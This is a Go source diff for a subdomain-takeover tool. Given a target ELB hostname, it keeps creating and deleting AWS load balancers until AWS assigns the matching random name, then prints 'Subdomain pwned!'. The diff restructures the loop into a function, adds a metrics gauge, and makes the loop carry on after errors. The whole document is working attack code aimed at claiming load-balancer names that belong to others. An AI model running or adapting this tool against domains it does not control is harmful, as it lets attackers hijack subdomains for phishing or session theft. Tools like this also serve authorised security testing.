@@ -6,6 +6,7 @@ import (
 	"log"
 	"net/http"
 	"regexp"
+	"strconv"
 	"time"
 
 	// AWS libraries
@@ -26,6 +27,23 @@ func main() {
 	go func() {
 		http.ListenAndServe(":2112", nil)
 	}()
+
+	// CLI flags
+	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
+	// Parse flags
+	flag.Parse()
+	fmt.Println(*elbPtr)
+	if *elbPtr == "" {
+		log.Fatal("You have to Specify the ELB")
+	}
+	if CreateDestroyLoop(elbPtr) == true {
+		fmt.Println("Found match!")
+		fmt.Println("ELB created!")
+		fmt.Println("Subdomain pwned!")
+	}
+}
+
+func CreateDestroyLoop(elbPtr *string) bool {
 	// Declaring different metrics
 	// Total number of ELBs created
 	var (
@@ -41,18 +59,18 @@ func main() {
 			Help: "The total number of ELBs deleted",
 		})
 	)
+	// Value of random number in elb
+	var (
+		elbRandomNumber = promauto.NewGauge(prometheus.GaugeOpts{
+			Name: "elb_subdomain_taker_elb_random_number",
+			Help: "The random number generated for the new ELBs by AWS",
+		})
+	)
 
-	// CLI flags
-	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
-	// Parse flags
-	flag.Parse()
-	if *elbPtr == "" {
-		log.Fatal("You have to Specify the ELB")
-	}
 	// We're using `MustCompile` so we fail hard if something's wrong with the regex
 	/*
 	   Define regex to match the "random" part of the ELB
-	   This will match any random string between 6 and 10 digits enclosed between `-` and `.`
+	              This will match any random string between 6 and 10 digits enclosed between `-` and `.`
 	*/
 	reNum := regexp.MustCompile(`-(\d{6,10})\.`)
 	// Get the "random" number from the elb
@@ -61,26 +79,26 @@ func main() {
 	fmt.Println(NumToFind)
 
 	/* All AWS Regions we're matching
-	us-east-2
-	us-east-1
-	us-west-1
-	us-west-2
-	ap-east-1
-	ap-south-1
-	ap-northeast-2
-	ap-southeast-1
-	ap-southeast-2
-	ap-northeast-1
-	ca-central-1
-	cn-north-1
-	cn-northwest-1
-	eu-central-1
-	eu-west-1
-	eu-west-2
-	eu-west-3
-	eu-north-1
-	sa-east-1
-	us-gov-east-1
+	   us-east-2
+	   us-east-1
+	   us-west-1
+	   us-west-2
+	   ap-east-1
+	   ap-south-1
+	   ap-northeast-2
+	   ap-southeast-1
+	   ap-southeast-2
+	   ap-northeast-1
+	   ca-central-1
+	   cn-north-1
+	   cn-northwest-1
+	   eu-central-1
+	   eu-west-1
+	   eu-west-2
+	   eu-west-3
+	   eu-north-1
+	   sa-east-1
+	   us-gov-east-1
 	*/
 	// Define the regex to match the region
 	reRegion := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
@@ -168,16 +186,19 @@ func main() {
 				// Message from an error.
 				fmt.Println(err.Error())
 			}
-			return
+			// We don't want to return if we have an error, just try again
+			// return false
 		}
 		// Increase elbCreated counter
 		elbCreated.Inc()
 		fmt.Println(result)
+		randomNumberNew, err := strconv.ParseFloat(reNum.FindStringSubmatch(*result.DNSName)[1], 64)
+		if err != nil {
+			fmt.Println(err)
+		}
+		elbRandomNumber.Set(randomNumberNew)
 		if *result.DNSName == *elbPtr {
-			fmt.Println("Found match!")
-			fmt.Println("ELB created!")
-			fmt.Println("Subdomain pwned!")
-			break
+			return true
 		}
 		// if we have an ELB at this point, we need to delete it to not pile them up
 		if *result.DNSName != "" {
@@ -198,18 +219,17 @@ func main() {
 					// Message from an error.
 					fmt.Println(err.Error())
 				}
-				return
+				// We don't want to return if we have an error, just try again
+				// return false
 			}
-			// Increase elbDeleted counter
-			elbDeleted.Inc()
-			fmt.Println("Deleted existing ELB successfully")
+			// Increase elbDeleted counter if there are no errors and print message
+			if err == nil {
+				elbDeleted.Inc()
+				fmt.Println("Deleted existing ELB successfully")
+			}
 		}
 		fmt.Println("Sleeping before we try again to avoid the rate limit")
 		time.Sleep(2000 * time.Millisecond)
 		fmt.Println("Next try")
 	}
-	fmt.Println("Found match!")
-	fmt.Println("ELB created!")
-	fmt.Println("Subdomain pwned!")
-
 }
